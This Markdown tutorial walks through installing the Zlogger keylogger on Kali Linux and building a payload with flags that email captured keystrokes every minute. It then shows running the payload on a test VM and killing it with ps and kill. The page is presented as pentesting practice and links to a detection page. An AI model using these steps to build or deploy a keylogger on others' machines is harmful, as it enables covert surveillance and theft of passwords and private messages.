# Zlogger In Action
_Zlogger_ is a popular keylogging tool that's used primarily for learning and pentesting on personal networks. The creators have a [Github page](https://github.com/z00z/ZLogger) where we can easily download the tool. Their github page also contains a plethora of information that may not be included in this small tutorial. In this section, I will guide readers through my short experience with Zlogger in hopes of offering something interesting or useful.

I performed all of these commands using Kali-Linux. These commands may or may not differ slightly depending on factors like OS and python version currently installed. 

---
## Downloading Zlogger
To start, head over to the _Zlogger_ Github page linked above. Next, we can clone the repository. In my case I cloned the repository to my Kali virtual machine. 

![image](https://user-images.githubusercontent.com/46944661/117089562-798df200-ad1b-11eb-841a-698e883d7f0c.png)

After doing this, we'll have a new directory created on our machine. If we type 'ls', we SHOULD see the newly created _Zlogger_ directory. Inside this directory there's a file called 'install.sh'. In order to run it, we must make the file executable. Use the command 'chmod +x install.sh' to make it an executable, and then run the file using './install.sh'. This may take some time, let the process run, agree + confirm any popups and once it's done Zlogger will now be usable.

## Create Our Keylogging File
Let's familiarize ourselves with our new tool. Since Zlogger is a python based program, we must use 'python' followed by Zlogger.py and whatever flags we'd like to specify. Running the command 'python zlogger.py -h' displays a handy menu that we can read and learn how to use Zlogger.

![image](https://user-images.githubusercontent.com/46944661/117090613-6af50a00-ad1e-11eb-87a1-a1a35ef08b9b.png)

>**NOTE:** *When testing, it seems that in my case '-i' or INTERVAL was required to avoid an error being thrown, despite the above image stating that interval is optional.*
*It's strongly recommended before continuing to create an email account for the sole purpose of using this keylogger else you run the risk of flooding your email address with the logs Zlogger sends.*

To get our keylogger file output to us, we must provide information to the tool. I typed 'python3 zlogger.py -i 60 -l -e [EMAILGOESHERE] -p [EMAILPASSWORDGOESHERE] -o ThisIsATest' and then hit enter. The -i flag indicates an interval of 60 seconds, which means every minute we will receive a new log file emailed to us. The -l flag tells Zlogger that we'd like the output file to be for Linux machines. The -e and -p flags should be for the emailaddress and password for the email address, while -o is the name of the output file. After hitting enter, this is what we're met with.

![image](https://user-images.githubusercontent.com/46944661/117171177-43d72080-ad90-11eb-8ef1-a1aafa8ed6d3.png)

Another use of 'ls' shows that our output file was created successfulyl. Although Zlogger stated that the -l flag would create a Linux executable, I had to execute 'chmod +x ThisIsATest' in order to be able to run the keylogger on my machine.

## Using The Keylogger File
So we've got our output file - now we've got to run it on our machine. I highly recommend running the file on a separate machine, although I chose to run it on my current virtual machine I've created for testing purposes. To start the keylogger, all we have to do is type 'python3 [OUTPUTFILENAME]' and the keylogger starts up. 

![image](https://user-images.githubusercontent.com/46944661/117227229-f54f7380-addb-11eb-91d6-03b6c354f0dc.png)

In the screenshot above, I typed some things just so I can have logs to review once they're sent to my email address. After waiting a couple minutes, we can see that log files have been delivered. The next screenshot shows the first log file, which is basically a confirmation that it's running and grabs the OS of the machine it's being run on as well as the name of the machine & the user.

![image](https://user-images.githubusercontent.com/46944661/117227406-5b3bfb00-addc-11eb-809b-92b7d0f43fa8.png)
![image](https://user-images.githubusercontent.com/46944661/117227438-68f18080-addc-11eb-890c-a5cc39460d7f.png)
![image](https://user-images.githubusercontent.com/46944661/117227499-89b9d600-addc-11eb-8afb-ca2bd2546945.png)

The remaining screenshots showcase the log files being sent every minute, as well as the logs that captured my keystrokes. 
We can also confirm as a user of the machine that we have a keylogger running by using the 'ps' command. The next screenshot shows 'python3' running, which is the process that's using python to capture keystrokes. Since I no longer wish to have the keylogger running on my machine, I need to use the 'kill' command followed by the process ID (PID) which in this case is 22595. After killing the process, I received a confirmation message stating that the process has been terminated.

![image](https://user-images.githubusercontent.com/46944661/117227699-0fd61c80-addd-11eb-9453-b72f18d9d279.png)

## Continue to the Next Page
- [Detection & Prevention](Detection&Prevention.md)

